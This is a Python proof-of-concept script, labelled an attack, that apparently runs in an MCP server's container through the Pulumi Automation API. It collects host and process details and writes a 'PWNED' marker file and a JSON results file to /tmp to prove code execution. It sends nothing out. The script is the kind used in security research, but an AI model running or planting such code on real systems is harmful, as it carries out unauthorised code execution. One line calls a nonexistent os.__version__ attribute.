#!/usr/bin/env python3
"""
SIMPLE ATTACK: MCP Server File Creation Test
This code runs in the MCP server's container via Pulumi Automation API
Creates a file to prove code execution works
"""

import os
import json
import time

def main():
    print("[ATTACK] Starting simple file creation test...")

    # Get container information
    container_info = {
        "hostname": os.uname().nodename,
        "working_directory": os.getcwd(),
        "python_version": os.__version__,
        "process_id": os.getpid(),
        "user_id": os.getuid(),
        "timestamp": time.time(),
        "attack_success": False
    }

    print(f"[ATTACK] Running in container: {container_info['hostname']}")
    print(f"[ATTACK] Working directory: {container_info['working_directory']}")
    print(f"[ATTACK] Process ID: {container_info['process_id']}")

    # Create proof-of-concept file
    proof_file = "/tmp/neo_pwned.txt"
    proof_content = f"""🎯 NEO CONTAINER PWNED! 🎯

Container Hostname: {container_info['hostname']}
Working Directory: {container_info['working_directory']}
Process ID: {container_info['process_id']}
User ID: {container_info['user_id']}
Timestamp: {time.ctime(container_info['timestamp'])}
Python Version: {container_info['python_version']}

This file was created by malicious code executed via:
- MCP Server (pulumi-cli-preview)
- Pulumi Automation API
- Containerized environment

Attack successful! Code execution confirmed.
"""

    try:
        # Create the proof file
        with open(proof_file, "w") as f:
            f.write(proof_content)

        print(f"[ATTACK] ✅ Successfully created proof file: {proof_file}")
        container_info["attack_success"] = True
        container_info["proof_file_created"] = proof_file

        # Also create a JSON results file
        results_file = "/tmp/attack_results.json"
        with open(results_file, "w") as f:
            json.dump(container_info, f, indent=2, default=str)

        print(f"[ATTACK] ✅ Results saved to: {results_file}")

    except Exception as e:
        print(f"[ATTACK] ❌ Failed to create file: {e}")
        container_info["error"] = str(e)

        # Still save error results
        error_file = "/tmp/attack_error.json"
        with open(error_file, "w") as f:
            json.dump(container_info, f, indent=2, default=str)

    print("[ATTACK] Test completed!")

    # Print proof content for MCP server output
    print("\n" + "="*50)
    print("PROOF OF EXECUTION:")
    print("="*50)
    print(proof_content)
    print("="*50)

    return container_info

if __name__ == "__main__":
    main()
